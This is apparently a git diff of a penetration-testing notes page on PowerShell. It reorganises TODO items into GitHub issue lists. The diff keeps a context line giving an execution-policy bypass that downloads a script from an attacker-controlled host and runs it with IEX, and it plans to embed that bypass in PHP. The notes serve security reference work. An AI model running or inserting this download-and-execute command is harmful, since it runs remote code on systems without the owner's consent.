@@ -288,9 +288,10 @@ Run `Get-Help $cmdlet_name -Examples` for usage
 
 ### Functions
 
-TODO: Break this table in sections by Category; Add description of difference between cmdlets and functions
-
-TODO: Add information about creating functions, anonymous functions
+TODO: (issue [#25](https://github.com/zweilosec/Infosec-Notes/issues/25))
+* Break PowerShell Functions section up by Category
+* Add description of difference between cmdlets and functions
+* Add information about creating functions, anonymous functions
 
 Run PowerShell scripts or C\# code directly from the terminal!
 
@@ -471,7 +472,7 @@ $PSVersionTable
 
 ## Script Execution Policy
 
-TODO: add short description about what this is and why it's important
+TODO: add short description about what this is and why it's important (issue [#26](https://github.com/zweilosec/Infosec-Notes/issues/26))
 
 | Policy | Description |
 | :--- | :--- |
@@ -704,13 +705,15 @@ wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html
 
 ### PowerShell Script Execution Bypass: 
 
-\[can embed in php too! TODO: write script example of this\]:
+TODO: Expand and clean up PowerShell Bypass section.  Link to Windows Privilege Escalation page (issue [#27](https://github.com/zweilosec/Infosec-Notes/issues/27))
+* Take examples from https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and add
+* Write script example of embedding the below PowerShell bypass in php script
+* Check the PowerShell example below and see if the trailing `-` means something is missing
+* Link or add this information to Windows Privilege Escalation page
 
 ```text
 Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$script_file) | PowerShell -NoProfile -
 ```
-
-* TODO: Look this up and find out if something is missing on the end...looks like a trailing `-`
 
 ### Silence PowerShell error messages
 
